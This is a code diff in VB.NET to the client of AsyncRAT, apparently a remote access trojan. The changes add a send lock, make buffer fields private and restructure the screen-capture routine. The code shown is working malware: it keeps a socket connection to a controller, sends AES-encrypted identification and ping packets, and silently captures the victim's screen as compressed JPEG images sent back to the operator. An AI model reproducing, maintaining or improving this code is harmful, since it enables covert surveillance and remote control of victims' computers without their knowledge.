@@ -71,12 +71,14 @@ Namespace AsyncRAT
 
         Public Shared isConnected As Boolean = False
         Public Shared S As Socket = Nothing
-        Public Shared BufferLength As Long = Nothing
-        Public Shared BufferLengthReceived As Boolean = False
-        Public Shared Buffer() As Byte
-        Public Shared MS As MemoryStream = Nothing
-        Public Shared Tick As Threading.Timer = Nothing
+        Private Shared BufferLength As Long = Nothing
+        Private Shared BufferLengthReceived As Boolean = False
+        Private Shared Buffer() As Byte
+        Private Shared MS As MemoryStream = Nothing
+        Private Shared Tick As Threading.Timer = Nothing
         Public Shared allDone As New ManualResetEvent(False)
+        Private Shared SendSync As Object = Nothing
+
 
         Public Shared Sub Main()
 
@@ -141,9 +143,8 @@ Namespace AsyncRAT
                 Debug.WriteLine("Connect : Connected")
 
                 isConnected = True
-
+                SendSync = New Object()
                 SendIdentification()
-
                 S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
 
                 Dim T As New TimerCallback(AddressOf Ping)
@@ -216,26 +217,28 @@ Namespace AsyncRAT
         End Sub
 
         Public Shared Sub Send(ParamArray Msgs As Object())
-            If isConnected = True Then
-                Try
-                    Dim Packer As New Pack
-                    Dim Data As Byte() = Packer.Serialize(Msgs)
+            SyncLock SendSync
+                If isConnected = True Then
+                    Try
+                        Dim Packer As New Pack
+                        Dim Data As Byte() = Packer.Serialize(Msgs)
 
-                    Using MS As New MemoryStream
-                        Dim Buffer As Byte() = AES_Encryptor(Data)
-                        Dim BufferLength As Byte() = SB(Buffer.Length & CChar(vbNullChar))
+                        Using MS As New MemoryStream
+                            Dim Buffer As Byte() = AES_Encryptor(Data)
+                            Dim BufferLength As Byte() = SB(Buffer.Length & CChar(vbNullChar))
 
-                        MS.Write(BufferLength, 0, BufferLength.Length)
-                        MS.Write(Buffer, 0, Buffer.Length)
+                            MS.Write(BufferLength, 0, BufferLength.Length)
+                            MS.Write(Buffer, 0, Buffer.Length)
 
-                        S.Poll(-1, SelectMode.SelectWrite)
-                        S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
-                    End Using
-                Catch ex As Exception
-                    Debug.WriteLine("Send : Failed")
-                    isConnected = False
-                End Try
-            End If
+                            S.Poll(-1, SelectMode.SelectWrite)
+                            S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
+                        End Using
+                    Catch ex As Exception
+                        Debug.WriteLine("Send : Failed")
+                        isConnected = False
+                    End Try
+                End If
+            End SyncLock
         End Sub
 
         Public Shared Sub EndSend(ByVal ar As IAsyncResult)
@@ -412,37 +415,34 @@ Namespace AsyncRAT
             End Try
         End Sub
 
-        Public Shared Sync As Object = New Object
         Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
-            SyncLock Sync
-                Try
-                    'Capture
-                    Using ScreenSize As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
-                        Using ImageScreenSize As Graphics = Graphics.FromImage(ScreenSize)
-                            ImageScreenSize.CompositingQuality = CompositingQuality.HighSpeed
-                            ImageScreenSize.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
-                        End Using
+            Try
+                'Capture
+                Using ScreenSize As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
+                    Using ImageScreenSize As Graphics = Graphics.FromImage(ScreenSize)
+                        ImageScreenSize.CompositingQuality = CompositingQuality.HighSpeed
+                        ImageScreenSize.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
+                    End Using
 
-                        'Resize
-                        Using Resize = New Bitmap(ScreenSize, W, H)
+                    'Resize
+                    Using Resize = New Bitmap(ScreenSize, W, H)
 
-                            'compress
-                            Using encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50)
-                                Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
-                                Using encoderParameters As EncoderParameters = New EncoderParameters(1)
-                                    encoderParameters.Param(0) = encoderParameter
-                                    Using MS As New MemoryStream
-                                        Resize.Save(MS, encoderInfo, encoderParameters)
-                                        Program.Send(CByte(PacketHeader.RemoteDesktopSend), MS.GetBuffer)
-                                    End Using
+                        'compress
+                        Using encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50)
+                            Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
+                            Using encoderParameters As EncoderParameters = New EncoderParameters(1)
+                                encoderParameters.Param(0) = encoderParameter
+                                Using MS As New MemoryStream
+                                    Resize.Save(MS, encoderInfo, encoderParameters)
+                                    Program.Send(CByte(PacketHeader.RemoteDesktopSend), MS.GetBuffer)
                                 End Using
                             End Using
                         End Using
                     End Using
-                Catch ex As Exception
-                    Debug.WriteLine("Capture" + ex.Message)
-                End Try
-            End SyncLock
+                End Using
+            Catch ex As Exception
+                Debug.WriteLine("Capture" + ex.Message)
+            End Try
         End Sub
 
         Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
